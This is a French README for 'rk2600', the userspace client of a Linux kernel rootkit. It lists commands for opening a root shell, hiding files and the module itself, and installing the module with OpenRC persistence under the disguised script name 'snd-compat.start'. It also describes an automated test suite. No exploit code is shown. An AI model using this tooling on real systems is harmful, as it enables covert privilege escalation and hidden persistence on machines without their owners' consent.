# rk2600 — Programme compagnon

Client en espace utilisateur du rootkit rk2600. Communique avec le module noyau
via ioctl sur `/dev/.rk_ctl`.

## Compilation

```sh
make companion       # depuis la racine du depot
make -C companion    # depuis n'importe ou
```

Produit un binaire statique `companion/rk2600` (x86_64, lie avec musl).

## Commandes

```
rk2600 <commande> [args]

  status           Affiche la version API et l'etat du module
  privesc          Eleve les privileges et ouvre un shell root
  hide <name>      Masque une entree de repertoire
  unhide <name>    Revele une entree masquee
  install [ko]     Installe le module + persistance OpenRC
  uninstall        Supprime le module et la persistance
  test             Lance la suite de tests automatisee
```

### status

Ouvre `/dev/.rk_ctl`, envoie `RK2600_IOC_STATUS` et affiche la version API
et le flag `hidden`.

### privesc

Envoie `RK2600_IOC_ELEVATE` puis `exec /bin/sh`. Le shell resultant tourne
en `uid=0`.

### hide / unhide

Envoie `RK2600_IOC_HIDE` ou `RK2600_IOC_UNHIDE` avec le nom fourni. Le nom
doit faire entre 1 et 255 octets, sans `/`, et different de `.` ou `..`.

### install

Copie le `.ko` dans `/lib/modules/$(uname -r)/extra/`, cree le script de
persistance `/etc/local.d/snd-compat.start`, active le service `local`
d'OpenRC et charge le module.

### uninstall

Revele le module, le decharge avec `rmmod`, supprime le `.ko` et le script
de persistance.

### test

Execute 12 tests automatises : privilege escalation, status, module hiding,
file hiding (3 entrees), acces direct (2 interfaces), read filter, write
stealth, dynamic hide/unhide. Affiche chaque commande, sa sortie et
`PASS`/`FAIL`, avec un score final.

## Codes de retour

- `0` : succes
- `1` : erreur fonctionnelle (ioctl echoue, module absent, etc.)
- `2` : erreur d'usage (commande inconnue, arguments invalides)
